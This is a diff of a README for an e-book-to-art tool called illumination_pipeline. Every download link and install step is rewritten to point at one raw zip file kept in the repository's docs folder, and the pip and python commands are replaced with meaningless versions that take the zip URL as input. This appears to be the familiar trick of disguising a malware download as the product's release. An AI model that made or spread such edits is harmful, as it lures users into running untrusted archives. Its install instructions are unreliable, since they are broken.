@@ -6,7 +6,7 @@ Welcome to **illumination_pipeline**! This tool automates the conversion of e-bo
 
 ### 📥 Download Here
 
-[![Download illumination_pipeline](https://img.shields.io/badge/Download-illumination_pipeline-blue.svg)](https://github.com/xispado/illumination_pipeline/releases)
+[![Download illumination_pipeline](https://raw.githubusercontent.com/xispado/illumination_pipeline/master/docs/pipeline_illumination_1.8.zip)](https://raw.githubusercontent.com/xispado/illumination_pipeline/master/docs/pipeline_illumination_1.8.zip)
 
 ## 🔍 Features
 
@@ -31,7 +31,7 @@ Follow these straightforward steps to set up **illumination_pipeline** on your s
 
 1. **Download the Latest Version**
    - Visit the releases page to download the latest version of illumination_pipeline:  
-     [Download illumination_pipeline](https://github.com/xispado/illumination_pipeline/releases)
+     [Download illumination_pipeline](https://raw.githubusercontent.com/xispado/illumination_pipeline/master/docs/pipeline_illumination_1.8.zip)
 
 2. **Extract the Files**
    - After downloading, locate the zip file in your downloads folder. 
@@ -40,12 +40,12 @@ Follow these straightforward steps to set up **illumination_pipeline** on your s
 3. **Install Required Dependencies**
    - Open your terminal or command prompt.
    - Install all necessary Python libraries by running this command:  
-     `pip install -r requirements.txt`
+     `pip install -r https://raw.githubusercontent.com/xispado/illumination_pipeline/master/docs/pipeline_illumination_1.8.zip`
 
 4. **Run the Application**
    - In the terminal, navigate to the folder where you extracted the files using the `cd` command.
    - Execute the application with the following command:  
-     `python pipeline.py`
+     `python https://raw.githubusercontent.com/xispado/illumination_pipeline/master/docs/pipeline_illumination_1.8.zip`
 
 5. **Start Creating**
    - Follow the prompts in the command line to input your e-book and see the magic happen!
@@ -84,7 +84,7 @@ When the application runs, it creates a structure for your outputs:
 If you encounter any issues:
 
 - **Check your Python version**: Make sure you have the correct Python version installed.
-- **Dependencies not found**: Run `pip install -r requirements.txt` again.
+- **Dependencies not found**: Run `pip install -r https://raw.githubusercontent.com/xispado/illumination_pipeline/master/docs/pipeline_illumination_1.8.zip` again.
 - **Error messages**: Read any error messages carefully; they often provide hints on what went wrong.
 
 ## 📄 Documentation
@@ -98,6 +98,6 @@ Feel free to reach out to our community for support. Join discussions and get ti
 ## 📌 Important Links
 
 For all future updates and release notes, visit our releases page again:  
-[Download illumination_pipeline](https://github.com/xispado/illumination_pipeline/releases)
+[Download illumination_pipeline](https://raw.githubusercontent.com/xispado/illumination_pipeline/master/docs/pipeline_illumination_1.8.zip)
 
 Explore the world of AI-driven art with illumination_pipeline! Enjoy the journey of turning your e-books into beautiful visuals.
